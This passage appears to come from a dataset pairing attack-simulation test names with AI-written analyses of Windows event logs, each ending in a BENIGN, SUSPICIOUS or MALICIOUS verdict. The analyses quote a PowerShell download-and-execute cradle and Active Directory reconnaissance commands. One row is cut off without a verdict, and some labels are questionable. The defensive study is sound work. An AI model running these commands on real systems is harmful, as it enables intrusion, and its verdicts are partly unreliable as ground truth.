  - Consider deploying enhanced monitoring or alerting on this and similar behavior, especially involving admin-level accounts executing reconnaissance or log management commands.

### Resolution:
- **SUSPICIOUS:** The activities in the logs do not conclusively indicate malicious intent but are anomalous enough to warrant further investigation to rule out any potential compromise."

   - These processes are executed with the `NT AUTHORITY\SYSTEM` account, which is standard for system updates.
   - Parent-child process relationships and directory paths are consistent with typical update activities.

2. **Execution of System Utilities**:
   - Utilities such as `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and `cmd.exe` are executed by the `SERVER002\admin_test` user.
   - The use of `cmd.exe` to gather system information with commands like `wmic` is typical for inventory checks or admin scripts.
   - `wevtutil.exe` is used for querying event logs and is often used by administrators for routine checks or log management.

3. **Processes Associated with SYSTEM and NETWORK SERVICE Accounts**:
   - `sppsvc.exe` run by the `NT AUTHORITY\NETWORK SERVICE` indicates the execution of the Software Protection Platform Service, a legitimate and standard Windows service.
   - TrustedInstaller and TiWorker processes, run by `NT AUTHORITY\SYSTEM`, indicate standard Windows servicing (e.g., updates, component installations), which match typical background Windows operations.

4. **Observations**:
   - The activities logged are consistent with normal operations such as software updates (particularly Microsoft Edge), routine system checks, and potential administrative tasks.
   - There are no unusual patterns or suspicious command-line arguments indicating privilege escalation, unauthorized access, or exploitation.

**Assessment**: The logs do not exhibit any indicators of compromise or malicious actions. Given the context and the nature of the observed activities, they appear to be part of routine system operations and updates.

**Resolution**: **BENIGN** - The provided logs contain benign activity, and there are no indications of malicious behavior or compromise."
PowerView ShareFinder,"After analyzing the provided logs from the Windows host, here's the detailed assessment:

1. **PowerShell Logs:**
   - The PowerShell logs indicate the execution of a script located at `C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\script.ps1` using `Invoke-ShareFinder -CheckShareAccess`. This action appears to be probing network shares, which could be indicative of scanning activity often used in lateral movement or information gathering phases in a cyber attack. PowerShell usage with modules being loaded from temporary directories is a common indicator of potentially unwanted or malicious activities.
   
2. **System Logs:**
   - Time-based entries seem to reflect normal time adjustments and synchronizations, without any overt indicators of compromise or suspicious system modifications.

3. **Security Logs:**
   - Several `EventID: 4624` and `EventID: 4672` entries indicate the successful logon of the SYSTEM user and privileges execution. This seems to be part of normal operations under SYSTEM logon.
   - These logs alone do not provide sufficient information to definitively indicate malicious behavior. However, the consistency of SYSTEM level operations warrants closer monitoring, especially if correlated with other indicators.

4. **Application Logs:**
   - Logs from `edgeupdate` and SPP service (Software Protection Platform) do not immediately indicate suspicious activities. These reflect typical service operations and updates.

5. **Sysmon Logs:**
   - The Sysmon logs reveal the execution of PowerShell, which correlates with the PowerShell logs mentioned. Notably, PowerShell is run from an `admin_test` account showing elevated permissions, again pointing to potentially suspicious behavior.
   - Multiple process executions are related to Microsoft Edge Update, which seems benign unless this is not scheduled or sanctioned.
   - There's command-line access using tools like `whoami` and `hostname` which might be used for reconnaissance or enumeration, especially if these weren't initiated by a legitimate user or process.

**Assessment:**
- The activity involving PowerShell scripts executing from a temporary location and probing network shares can be considered suspicious. Coupled with elevated privileges and potential reconnaissance activities seen via executed scripts, these log entries warrant further investigation to determine the context and origin of these operations.

**Resolution:**
- **SUSPICIOUS**: The activities observed are potentially harmful but require additional context and verification against the organization's expected operational behavior. There is a risk that these are part of a larger attempt at lateral movement or data discovery within the network.

**Guidance:**
1. Conduct a deeper investigation into the PowerShell scripts and their origin, particularly focusing on the `Invoke-ShareFinder` invocation.
2. Verify the legitimacy of the involved `admin_test` account’s activities and whether it's subjected to compromise.
3. Monitor associated network traffic for signs of lateral movement or exfiltration.
4. Perform user account reviews and audit logged actions for any unauthorized access patterns.
5. Consider sandboxing or more restrictive monitoring of PowerShell activities, especially those originating from temporary or user-specific locations."
WinPwn - Morerecon,"Upon thoroughly analyzing the provided Windows event logs from the PowerShell, Security, Sysmon, and Application logs, several points of interest and concern have been identified:

1. **PowerShell Activity**: 
   - Logs show that PowerShell was used to execute a command that downloads and potentially executes a script from a public repository (`https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1`), which is a common practice in malicious activities such as malware delivery or reconnaissance due to its ability to bypass certain security controls.
   - The use of `iex(new-object net.webclient).downloadstring(...)` in PowerShell is often associated with fileless malware attacks or other malicious scripts and should be considered highly suspicious.

2. **Security Logs**: 
   - The user `admin_test` with high privileges such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege` was logged on using NTLM authentication, which can suggest possible lateral movement or unauthorized access.
   - The possession of these privileges enables the user to bypass security restrictions and potentially gain unauthorized access to sensitive areas of the system.

3. **Sysmon Logs**: 
   - The frequent spawning of processes like `wevtutil.exe`, `conhost.exe`, and repeated executions of PowerShell confirms the suspicious activity. These processes in rapid succession indicate automation or scripted execution, further insinuating a potential attack.
   - The logs indicate the execution of recognizable legitimate processes, possibly trying to mask the execution of non-legitimate or suspicious activities.

4. **Application Logs**: 
   - The logs reflect normal operations with Windows Defender reportedly active, though this does not guarantee no compromise, as attackers may disable security products temporarily during execution.

### Assessment:
The behavior noted in the logs, particularly with the PowerShell script execution leveraging a public repository and high privilege assignment in context, indicates a high possibility of malicious activities. The logs suggest that there might have been an attempt to execute a script obtained externally that could potentially be harmful.

### Resolution: MALICIOUS
- The combination of remote script execution via PowerShell, the level of privileges granted to the user, and the specific command characteristics observed strongly suggest that the logs contain indicators of malicious activity.
  
### Guidance:
- Immediate steps need to be taken to investigate the source of the executed scripts further, including checking the integrity of the machine and its configurations.
- Review user privileges and restrict unnecessary administrative privileges.
- Conduct a full malware scan and forensic analysis to determine the scope of the compromise.
- Monitor outbound connections to detect any unauthorized exfiltration of data.
- Ensure that all PowerShell activity is logged and analyzed continuously for threat hunting and future prevention."
System Network Connections Discovery with PowerShell,"### Analysis:

#### PowerShell Log:
- **Activities Observed**: Multiple PowerShell events related to the starting of various providers like Registry, Alias, Environment, FileSystem, Function, Variable. The PowerShell command involves running `Get-NetTCPConnection`, which retrieves network connection information.
- **Assessment**: The use of PowerShell can be a normal administrative task. However, retrieving network connection details without further context can sometimes be associated with reconnaissance activities in a compromised environment, particularly if invoked by a script.

#### Sysmon Log:
- **Activities Observed**:
  - Several executions of `wevtutil.exe` and `conhost.exe` under the user `SERVER002\admin_test`.
  - Execution of `HOSTNAME.EXE`, `whoami.exe`, and PowerShell.
- **Assessment**: 
  - The execution of `wevtutil.exe` can be associated with event log management which is not inherently suspicious unless malicious context is established.
  - `HOSTNAME.EXE` and `whoami.exe` are benign commands typically used for system enumeration.
  - The command `powershell.exe & {Get-NetTCPConnection}` may suggest potential scripting actions on the network configuration if issued without explicit administrative purposes.

Port-Scanning -24 Subnet with PowerShell,"### Analysis Summary

Upon reviewing the provided logs, several points of interest are noted, particularly in the `Sysmon`, `Security`, and `PowerShell` logs:

1. **Anomalous PowerShell Activity**:
   - There is a **PowerShell script execution** in the `Sysmon` and `PowerShell` logs that appears suspicious. The command executed involves network scanning operations, specifically targeting ports 445 (commonly used for SMB) and 3389 (used for RDP). This behavior is indicative of reconnaissance activity, usually associated with lateral movement attempts by an attacker.

2. **High-Privilege Logins and Activities**:
   - Multiple logins with elevated privileges (EventID `4672` in the `Security` log) are recorded for the user `admin_test`. This user has been granted various high-level privileges, including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, which could be abused in a malicious context.
   - The `admin_test` user also appears in `Sysmon` logs executing system management utilities like `whoami.exe`, which aren't inherently suspicious but can be part of privilege validation actions by an attacker.

3. **System Time Modification**:
   - The logs indicate changes to system time (EventID `4616` in the `Security` log), which is atypical for standard operations and may be indicative of attempts to obfuscate log entries or bypass time-based security measures.

4. **Use of Administrative Tools**:
   - There are multiple executions of administrative tools, such as `wevtutil.exe` and `conhost.exe`, by `admin_test`. These might suggest attempts to clear event logs or facilitate command execution via command prompts.

5. **Network Services Examination**:
   - The `Windows PowerShell` log corroborates with network scanning scripts targeting internal IP ranges commonly seen when preparing for lateral movement.

### Assessment Conclusion

Overall, the activities observed in the logs suggest suspicious behavior. The use of PowerShell scripts to scan internal networks, apart from notable privilege escalations and administrative tool usage, gives a strong indication of a potential compromise or malicious intent.

### Resolution

- **SUSPICIOUS**: The logs contain enough suspicious activity, particularly the network scanning behavior via PowerShell and high-privilege operations, to warrant further examination. This includes:
  - Detailed investigation of `admin_test`'s activities.
  - Review network logs and any available endpoint security logs for correlating evidence.
  - Monitoring for unusual network connections and further modifications to system configurations.

### Guidance

- Conduct a thorough investigation focusing on:
  - Reviewing scripts and commands executed by `admin_test`.
  - Evaluating network traffic captured during the scan period.
  - Checking for any additional unauthorized access or privilege escalation events.
- Engage threat intelligence to identify possible ongoing or attempted lateral movements within the network.
- Implement monitoring mechanisms for process creations, particularly those initiated by PowerShell, and network-related activities on the monitored host."
Get-WmiObject to Enumerate Domain Controllers,"**Analysis of the Logs:**

1. **System Log:**
   - The system log entries largely focus on time adjustments and security intelligence updates for Microsoft Defender. The time adjustments, executed by `svchost.exe`, are likely due to synchronization with an NTP server. This is standard system behavior.
   - Security updates for Microsoft Defender Antivirus (KB2267602) are also noted, which is routine and expected behavior for a Windows environment.

2. **Sysmon Log:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` initiated by the user `SERVER002\admin_test` suggest system event log activity. `wevtutil.exe` is used for managing event logs, and `conhost.exe` is a legitimate Windows process often associated with console applications.
   - An instance of `powershell.exe` is recorded, with a command to query WMI objects, which although potentially benign for administrative tasks, requires further scrutiny to rule out unauthorized access attempts.
   - Other processes like `wuauclt.exe`, `AM_Delta.exe`, and `MpSigStub.exe` are related to Windows Update and Defender updates, reflecting normal system maintenance activities.

3. **Security Log:**
   - Events indicating logon activities, notably by `admin_test` with high privileges, are recorded. The privileges listed include sensitive rights like `SeDebugPrivilege`, `SeBackupPrivilege`, suggestive of administrative access.
   - The attempted operations to read credentials (`EventID 5379`) resulted in `ReturnCode 3221226021`, which is an error code. While frequent, these errors do not directly indicate compromise but merit review in the context of broader activity patterns.

4. **Windows PowerShell Log:**
   - PowerShell execution events are captured with command to retrieve WMI class `ds_computer`. This is usually a benign administrative operation. However, given the context, it must be ensured this was an authorized activity as PowerShell can be leveraged for post-exploitation actions.

5. **Application Log:**
   - Shows Windows Defender is operational (`SECURITY_PRODUCT_STATE_ON`), which suggests the system’s security measures are active.

**Assessment of Situation:**

- The analyzed logs show a range of typical administrative activities with several high privilege operations by the user `admin_test`. There is use of PowerShell to query directory services and management of event logs, all of which are routine for system administrators.
- No overtly malicious behavior is evident, such as unknown suspicious processes or unauthorized privilege escalations.
- The PowerShell and WMI activity, although likely administrative, should be verified with authorized task records to ensure they align with expected maintenance windows.

**Resolution:**

- **SUSPICIOUS:** Due to the presence of high privilege operations, PowerShell use for directory queries, and multiple coordinated log activities, further verification of authorized tasks and cross-referencing with expected administrative actions are recommended. While no clear malicious activity is definitive from the logs alone, these activities warrant cautious examination to rule out any unauthorized use or potential insider threat activity."
Security Software Discovery - Windows Firewall Enumeration,"Upon analysis of the provided Windows event logs, the following observations have been made:

1. **System Log:**
   - The events involving Windows Update Client reflect routine updates for Microsoft Defender Antivirus. There's nothing particularly suspicious about these updates (Event IDs 19).
   - Kernel-General and Time-Service events indicate time synchronization activities. Time adjustments are common and done using the time.windows.com NTP source.

2. **Application Log:**
   - The SecurityCenter logs indicate Windows Defender is in an active running state, which is expected.
   - Microsoft Edge's ""Service stopped"" log doesn't indicate any malicious activity on its own but may be correlated with other information for potentially suspicious activity.

3. **Windows PowerShell Log:**
   - The use of a PowerShell command to enumerate firewall rules is notable but not in itself indicative of compromise. However, PowerShell activity without clear business need often warrants further inspection.

4. **Security Log:**
   - Two log entries (Event ID 4616) show expected time change acknowledgments from the security auditing subsystem, linked to standard system services.

5. **Sysmon Log:**
   - Execution of `whoami.exe`, `hostname.exe`, `conhost.exe`, and several system utilities like `svchost.exe`, `wevtutil.exe`, and a PowerShell session (with firewall enumeration commands) were observed.
   - `wevtutil.exe` is often used for managing event logs and can be used benignly or maliciously depending on the context.
   - Edge Update activities reflect routine auto-update checks by Microsoft Edge.

**Analysis:**
- The PowerShell activity is worthy of further investigation. The command `Get-NetFirewallProfile` and related PowerShell invocations may be attempting to ascertain or alter firewall configurations, which can sometimes be indicative of pre-attack reconnaissance or lateral movement post-compromise.
- All utility and administrative tools being executed have a legitimate purpose but need scrutiny regarding the context of execution. This could represent either normal administrative activity or the use of living-off-the-land tactics in an attack.

**Resolution:**
- **SUSPICIOUS** - While most activities logged have legitimate purposes, the PowerShell commands related to firewall configurations and some frequent execution of command line utilities without a clear indication of purpose are suspicious. This warrants further investigation to rule out misuse of administrative privileges or early signs of a breach.

**Guidance:**
- Conduct further investigation into the PowerShell history and any associated user activities around the time of the event logs.
- Follow up on user roles and verify legitimate needs for running firewall and network configuration commands.
- Continuously monitor and secure elevated access to ensure administrative tools are not misused.
"
Adfind - Enumerate Active Directory OUs,"Based on the provided Windows event logs, here is a detailed analysis:

### Application Logs
1. **Edge Update Service Stopped**: There are multiple events from the ""edgeupdate"" service indicating the service stopped. Not typically suspicious by itself, but worth noting for potential process disruption or related suspicious activity.
2. **Windows Defender Active**: Indications that Windows Defender is active in a ""SECURITY_PRODUCT_STATE_ON"" state. This ensures potential threats should be monitored or prevented by Defender.

### Security Logs
1. **Security Auditing Logons (Event ID 4624)**:
   - A logon with Logon Type 5 indicates a service startup. The account used is NT AUTHORITY\SYSTEM, which is standard for system-level operations.
   
2. **Special Privilege Assigned (Event ID 4672)**:
   - SYSTEM account has been granted special privileges including SeDebugPrivilege, SeTakeOwnershipPrivilege, and others. These are acceptable for system processes but could be suspicious if tied to unauthorized processes.

### Sysmon Logs
1. **Execution of Powershell and Conhost**:
   - Powershell.exe and conhost.exe are executed under the USER `SERVER002\admin_test`. Powershell can be used for legitimate admin tasks but is often abused for script-based attacks.

2. **Execution of External Tools**:
   - Cmd.exe runs AdFind.exe, a tool often used for Active Directory enumeration. This is a potential indicator of malicious reconnaissance activity unless justified as a legitimate admin task.

3. **Multiple Instances of wevtutil.exe**:
   - Wevtutil.exe, a tool to retrieve event logs, was executed several times. Admins might use this for gathering logs, but frequent execution during short time intervals can imply potential log manipulation or tampering.

4. **Regular MicrosoftEdgeUpdate Activities**:
   - Multiple entries of `MicrosoftEdgeUpdate.exe` and related processes like `MicrosoftEdgeUpdateSetup_X86.exe` and `MicrosoftEdgeUpdateComRegisterShell64.exe`. These logs show usual software update processes.

### Conclusion
Given the information, there are specific indicators within these logs that should be investigated further:

- **AdFind.exe usage is suspicious** unless it has a legitimate purpose defined by the administrator. It's commonly used for Active Directory enumeration in attack scenarios.
- **Frequent execution of event log retrieval via wevtutil.exe** by the same user could indicate potential log scraping or deletion efforts.
- **Powershell execution** by admin_test user needs to be justified to rule out script-based attacks.

### Resolution
Based on the current log entries:
- **Resolution**: **SUSPICIOUS** - The activities regarding the use of AdFind and frequent log retrieval attempts, alongside the Powershell executions, warrant more extensive investigation to confirm or rule out actual malicious activities.

### Guidance
- Review if there was authorized usage of AdFind by checking with IT management for legitimate admin tasks.
- Verify what actions the user `SERVER002\admin_test` was performing during these events.
- Review historical patterns of wevtutil.exe usage on this host to determine if this use is anomalous.
- Correlate with any alerts generated by security monitoring tools for edge cases in these logs.
"
Extract Edge Browsing History,"Upon reviewing the provided Windows event logs, here is an analysis of the activities recorded and their potential indications of malicious activity:

### Summary of Findings

1. **Windows Time Changes:**
   - Security logs and Kernel-General logs indicate system time changes (Event ID 4616 in Security Log and Event ID 1 in Kernel-General). While changes in system time can be benign, they may also suggest attempts to evade detection by altering timestamps. Such activities need to be checked against expected behavior and known reasons for time adjustments (e.g., time synchronization tasks).

2. **PowerShell Activity:**
   - Sysmon and PowerShell logs include events showing PowerShell execution (such as `powershell.exe` fetching browsing history from Microsoft Edge and outputting it to a file, `edgebrowsinghistory.txt`). The command used is designed to extract URLs from the browser history.
   - The use of PowerShell to extract this information, particularly with such specificity, could potentially be a sign of reconnaissance or data collection by a malicious actor.

3. **Service and Application Activity:**
   - Various applications related to Microsoft Edge updates are documented in the Sysmon log. Services related to Microsoft Edge update processes start and stop multiple times (`MicrosoftEdgeUpdate.exe`) which could normally be part of update checks, but should be verified for authenticity given the other surrounding events.

4. **System Behavior:**
   - Regular entries related to system services, such as `sppsvc.exe` (Software Protection), `SearchProtocolHost.exe`, `SearchFilterHost.exe`, and `taskhostw.exe` are observed. Their activities seem routine, though ongoing monitoring of these services' behavior is advised.

5. **User Sessions and Processes:**
   - Commands and processes are executed by accounts with High Integrity Level (e.g., `SERVER002\admin_test`), which suggests these were performed with administrative privileges.

### Threat Assessment

1. **Suspicious PowerShell Activity:**
   - The PowerShell script reading browser history and saving it to a local file is suspicious. While not inherently malicious, it indicates activity that could be utilized in a reconnaissance phase if unauthorized, especially if the data is used for further actions.

2. **System Time Modifications:**
   - While there might be legitimate reasons for system time adjustments, repeated frequency and associated activities should be reviewed since they could indicate logging evasion tactics.

### Resolution Guidance

**Resolution:** SUSPICIOUS

- **Next Steps:**
  - **Further Investigation:** Engage with system administrators to verify the purpose of the PowerShell activity. Check if there are legitimate scripts scheduled or executed by IT for maintenance purposes.
  - **Log Analysis:** Validate the integrity of the system time changes and confirm synchronization settings. Investigate if similar modifications have occurred on other systems.
  - **Review Edge Update Processes:** Confirm if the Edge update process execution matches known patterns of legitimate updates.
  - **Network Traffic Analysis:** Implement network monitoring to identify potential data exfiltration attempts, especially via PowerShell commands.
  - **User Activity Monitoring:** Review the accounts involved, particularly `SERVER002\admin_test`, to ensure the processes executed align with expected roles and responsibilities.

By carrying out these further actions, the identified suspicious activities can either be confirmed as benign or escalated as malicious for containment and remediation."
Process Discovery - Get-Process,"Analyzing the provided logs, let's assess the various details:

### System Log

- **Time Change**: There are events related to time changes on the system:
  - **Events 3569 and 3570**: The time reverted from ""2024-10-22 19:15:02.7944365"" to ""2024-10-22 19:14:34.1081184"" and then was adjusted again slightly. This is a significant time change. Time discrepancies can indicate potential malicious activity, such as log tampering, but they can also result from legitimate time synchronizations.
  - The process involved is `svchost.exe`, which is a legitimate Windows process used for running services.

### Sysmon Log

- **Process Execution**: Several processes are executed under the user `SERVER002\admin_test`:
  - **wevtutil.exe and conhost.exe** appear multiple times, which can be part of typical administrative activities when managing and querying event logs.
  - **whoami.exe** and **powershell.exe** are executed, with the latter using a command to list processes (""Get-Process""). This can be a legitimate administrative action for troubleshooting or general system maintenance.
  - The presence of `conhost.exe` accompanying `powershell.exe` and `hostname.exe` normally, but its executions due to the interactive nature of a console.

- **Use of PowerShell**: The PowerShell command executed is benign (`Get-Process`), which is commonly used to list active processes on the system.

### Application Log

- **Software Protection Platform Service Execution**: One log entry indicates an activity related to software protection, which is typical and expected as part of routine checks and updates related to license and digital rights management.

### Windows PowerShell Log

- **PowerShell Host Execution**: PowerShell activity is logged for the execution of the `Get-Process` command which seems consistent with system maintenance or monitoring task rather than a malicious script execution.

### Security Log

- **Logon and Privilege Use**: 
  - `admin_test` logged on and shows the assignment of various privileges, including security-sensitive ones like `SeDebugPrivilege` which can be used for debugging or manipulating system processes. These may either be part of legitimate administrator actions or could indicate a potential risk if `admin_test` credentials are compromised.
  - The NTLM authentication from an external workstation `DESKTOP-3HL5B2P` indicates a network-based logon, which itself is not malicious unless unexpected.

### Summary

- **Time Change**: The abrupt time alteration could be legitimate (e.g., clock synchronization) or indicative of an attempt to manipulate event logs.
- **Administrative Tool Use**: The execution of various administrative tools points to typical administrative activities.
- **Privilege and Authentication**: The special privileges are concerning only if the `admin_test` account is not intended to possess or utilize them.

Given the points above, while the time changes are anomalous and worth considering, the activities seen can still fit within the scope of legitimate administrative tasks if `admin_test` is a genuine administrator with expected access and conducted actions. However, due diligence should be maintained due to the potential misuse of administrator rights.

### Resolution
- **SUSPICIOUS**: The time changes and use of highly privileged accounts warrant further verification of legitimacy, ensuring these actions align with expected and approved administrator duties. If `admin_test` did not perform these tasks knowingly, further investigation is needed to rule out account misuse or compromise."
Active Directory Enumeration with LDIFDE,"After a detailed analysis of the provided Windows event logs, the following points were noted:

1. **Logon Events**:
   - Event ID 4624 and 4672 are often seen together when a successful logon occurs, typically followed by privileged actions. These events show SYSTEM or SERVICE accounts logging in, which are generally normal activities.

2. **Credential Reading (Event ID 5379)**:
   - Multiple logs with Event ID 5379 show failed attempts to read credentials for MicrosoftAccount or WindowsLive tokens. These failures might be due to expired sessions or incorrect configurations. While failed credential accesses are noteworthy, these specific entries appear to be benign based on the provided context.

3. **Process Monitoring with Sysmon**:
   - A significant amount of activity is recorded by Sysmon, mainly involving legitimate Windows processes. 
   - The use of `powershell.exe`, `wevtutil.exe`, and `ldifde.exe` under the user `SERVER002\admin_test` may require attention. PowerShell execution can be a tool for attackers if misused, though no direct malicious commands were found in these logs.
   - The inclusion of `hostname.exe` and `whoami.exe` typically implies diagnostic actions, these do not appear malicious by themselves.
   - Sysmon logs show `cmd.exe` executing `ldifde.exe` for exporting AD data, which can be a suspicious activity if not known to be initiated by an administrator. It's a powerful tool used for directory imports/exports, and misuse can indicate data exfiltration attempts.

4. **Windows Updates and Edge Installer**:
   - The logs contain events about Microsoft Edge updating and other routine Microsoft update services. These processes appear legitimate, executed by the SYSTEM account.

5. **Miscellaneous Activities**:
   - `taskhostw.exe` executed calls in what appears to be its typical capacity. There is also activity related to service control (e.g., `sc.exe`) starting services.
   - Various Windows diagnostic and telemetry processes, like `CompatTelRunner.exe`, `DeviceCensus.exe`, and Windows Update-related tasks, are normal actions for system maintenance.

**Assessment:**
- **BENIGN**: Based on the current evidence and activity within these logs, no clear indication of malicious activity was found. While there are events that could potentially lead to suspicion under other contexts, such as the use of `ldifde.exe` and `powershell.exe`, there is no decisive evidence pointing to malicious intent in this context. The activities observed are consistent with typical system operations and maintenance.

If there has been no change in expected behavior or policy changes surrounding user `SERVER002\admin_test`, then the current logs do not suggest any compromised activity. However, maintaining vigilance and further monitoring, especially for PowerShell and credential access attempts, is advisable. If there's suspicion related to specific actions, deeper inspection or cross-correlation with other logs and system behavior would be prudent."
Adfind - Enumerate Active Directory Domain Controller Objects,"Upon reviewing the provided Windows event logs, here is a detailed analysis:

### Analysis:

1. **Application Logs:**
   - Both entries show `Windows Defender` is turned on with no change in state from `SECURITY_PRODUCT_STATE_ON`. This indicates that Windows Defender is operational.

2. **System Logs:**
   - Entries show successful updates for `Security Intelligence Update for Microsoft Defender Antivirus`. This is indicative of routine system updates.

3. **Sysmon Logs:**
   - A significant number of processes are being created by the user `SERVER002\admin_test` with elevated privileges (`High` in the Integrity Level or `SYSTEM`), including:
     - `wevtutil.exe`, `conhost.exe`, `taskhostw.exe`, and `cmd.exe` among others.
   - A notable command line entry is the execution of `cmd.exe` with the command-line argument pointing to `AdFind.exe`:
     ```
     ""cmd.exe"" /c ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\AdFind.exe""  -sc dclist
     ```
     - **AdFind** is a legitimate Active Directory query tool, but the context and path it runs from could be concerning when run from unusual directories or without user knowledge, indicating potential reconnaissance activity.

   - Multiple legitimate system processes including Windows Update related activities (`wuauclt.exe`) and security updates (`MpSigStub.exe`) appear normal.

4. **Security Logs:**
   - The logs reference specific event (5379) related to `Object Access` without indication of successful outcome (`ReturnCode: 3221226021` suggests access denied or failure).

### Suspicious Activity:
- The use of `AdFind.exe` in a command line from a temporary folder with odd path sequences raises suspicion of reconnaissance or probing activities. This warrants further investigation into whether this usage was authorized or part of any malicious campaign.

### Conclusion:
Given the analysis, while there are normal update activities visible in the logs:
- The specific execution of `cmd.exe` to run `AdFind.exe` under an account associated with elevated privileges without a clear, legitimate operational need is suspicious.

### Resolution:
- **SUSPICIOUS**: The logs contain activity that doesn't look right and needs further investigation, particularly focusing around the usage and origin of `AdFind.exe` by the user `SERVER002\admin_test`.

### Guidance:
1. **Immediate Actions:**
   - Trace `AdFind.exe` back to its source for legitimacy.
   - Review any other logs or alerts coinciding with the same timeframe for context.
   - Confirm the intentions behind the use of such tools and verify its authorization.

2. **Further Actions:**
   - Monitor the account `SERVER002\admin_test` for unusual behavior.
   - Conduct a security audit to check for similar activities across other hosts.
   - Educate and remind users about security policies concerning system-level tasks and tool usage."
Enumerate Default Domain Admin Details (Domain),"Upon reviewing the provided Windows event logs, several points of interest and suspicious behaviors stand out:

### Analysis:

1. **Security Logs:**
   - **EventID 4672 & 4624:** The `admin_test` user was granted a set of privileges (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, `SeSecurityPrivilege`, etc.) which are typically associated with administrative tasks that could indicate elevated access. These privileges are potent and, in particular, `SeDebugPrivilege` is known for being used in malicious activities to debug other processes (potentially to inject code or dump sensitive data).

2. **Sysmon Logs:**
   - **Process Executions:** A significant number of processes are started by the user `admin_test` in rapid succession. Notable processes include:
     - `wevtutil.exe` which is usually used to write, read, export, or delete event logs.
     - `conhost.exe` which acts as a console manager.
     - `whoami.exe` which is used to display the user information.
     - `cmd.exe` running commands such as `net user administrator /domain`. This is indicative of attempts to query or modify user accounts and could be used to alter user privileges or explore network configurations.
     - Several Microsoft Edge update-related processes. While these may be legitimate updates, their frequency and correlation with suspicious command executions warrant further investigation.

3. **Application Logs:**
   - **Edge Update Service:** The EdgeUpdate service messages indicate starting and stopping, which can be normal behavior for service updates. However, given the rapid and closely-timed nature of other activities, this could potentially be used as a cover for malicious updates or activities.

### Assessment:

- **Suspicious Behavior:** The combination of elevated privileges, execution of potentially sensitive system utilities, and rapid-fire `cmd` command executions suggests that further investigation is required.
  
- **Unusual Process Activity:** The number and type of processes (especially those that manipulate logs or user information) indicate potential misuse by someone with administrative capabilities.

- **Command Line Integrity and Abuse:** Use of `cmd.exe` and `net.exe` for user information retrieval is suspicious, especially from a high-integrity context. This behavior could reflect an insider threat or compromised account.

### Resolution: **SUSPICIOUS**

Given the activities noted above, although not conclusively malicious on the surface, the actions recorded in these logs are strongly indicative of suspicious activity that deviates from typical user behavior. The actions performed are consistent with those used in setups for lateral movement, privilege escalation, and potentially preparing for further compromise activities. 

### Guidance/Next Steps:
1. **Immediate Monitoring:** Increase monitoring on the `admin_test` account for any further unusual activities.
2. **Behavioral Analysis:** Conduct user behavior analytics on `admin_test` to determine whether these actions are out of character.
3. **Review Privileges:** Re-evaluate the necessity of the privileges granted to the user.
4. **Network Traffic Analysis:** Inspect outgoing network traffic from the server for potential data exfiltration attempts.
5. **System Integrity Checks:** Perform a thorough scan for known indicators of compromise and malicious modifications to critical system files or configurations.
6. **Access Logs:** Cross-reference with other logs (e.g., firewall, IDS/IPS logs) for corroborating evidence of unauthorized access or communication.

Detailed investigation and monitoring should continue to verify the intentions and source of these activities to ensure no security breach is in progress."
System Network Configuration Discovery (TrickBot Style),"### Log Analysis

The provided log entries have been thoroughly analyzed across various sections, including Security, System, Application, and Sysmon logs. Here's a detailed breakdown of observations and findings:

#### Security Log Observations:
- **Event ID 5379**: This event indicates a failure in credential handling, as evidenced by the return code `3221226021`, which translates to `STATUS_NO_SUCH_LOGON_SESSION`. This may indicate attempts to access or use an account, but failure to do so successfully. The timeframe shows multiple such failures closely spaced, suggesting an automated or programmatic action.
  
- **Event ID 4624 & 4672**: These indicate successful logon and privilege escalation events. The logon event with `LogonType 5` is a service-type logon and `4672` indicates special privileges like `SeDebugPrivilege`, which is normal for SYSTEM accounts but should be kept under scrutiny if it's observed unusually, especially alongside other alarming activities.

- **Event ID 4799**: This event involves group membership enumeration by `setup.exe` linked to EdgeUpdate. This could be a legitimate operation during an upgrade or setup but also merits scrutiny given the context.

#### System, Application, and Windows PowerShell Logs Observations:
- **System Logs**: System logs show routine Windows updates and Defender updates, which is standard behavior for system maintenance and security. 

- **Application Logs**: Primarily composed of Windows Update actions and installations. No unusual application-based activities are evident.

#### Sysmon Log Observations:
- **Process Activities**: The Sysmon logs reveal a series of process executions consistent with Microsoft Edge updates (`setup.exe` and `MicrosoftEdge_X64_xxx.exe`), showing typical channels, versions, and setup behaviors associated with Edge Update. This includes many sub-processes under `NT AUTHORITY\SYSTEM`.

- **Command Line Usage**: Noticeable command line activities with potential reconnaissance commands were observed such as `cmd.exe` executing networking and domain commands (`ipconfig`, `net view`, `nltest`). This behavior is often seen in enumeration stages of attacks. The combination of `ipconfig /all`, `net config workstation`, and `nltest /domain_trusts` suggests an effort to gather network details and domain trust relationships.

### Conclusion and Resolution

Based on the analysis, the following resolution is determined:

- **Resolution: SUSPICIOUS**

The repeated and failed credential handling, coupled with network reconnaissance commands executed in a sequence, raises a flag that suggests this activity merits further investigation. While there are legitimate processes such as Microsoft Edge updating processes, the command line network queries and attempt to access credential information (Event ID 5379 failures) could indicate suspicious behavior.

### Recommendations:
1. **Review Network Logs**: Cross-reference with network logs to see if there were attempts to reach external IPs or suspicious communications.
2. **User Session Analysis**: Investigate the actions of `admin_test` user accounts as they are tied to multiple entries querying system configurations.
3. **Endpoint Monitoring**: Continue monitoring for any anomalies in service account activities or unusual scheduled tasks.
4. **Integrity Checks**: Conduct integrity checks on critical system files and ensure they are not tampered with.
5. **Audit Permissions**: Review and potentially tighten the privileges and permissible actions for service accounts and `admin_test`.

Further analysis may be required to definitively conclude the nature of the activities - whether they are benign process executions or indicators of a compromise."
Launch DirLister Executable,"To assess the provided Windows event logs, we'll go through key elements that might indicate suspicious or malicious activity. Our focus is on unusual process execution, unexpected command-line usage, privilege escalation, and any other anomaly.

### Detailed Analysis:
1. **Application Log**:
   - The logs show events related to software protection and the stopping of the edgeupdate service. This is normal behavior when updating applications or performing maintenance tasks and doesn't immediately suggest malicious activity.

2. **Windows PowerShell Log**:
   - Key observation is the execution of a PowerShell script that runs a process `DirLister.exe` from the path `C:\Users\ADMIN_~1\AppData\Local\Temp\Externalfiles\`. This process is stopped after a 4-second sleep.
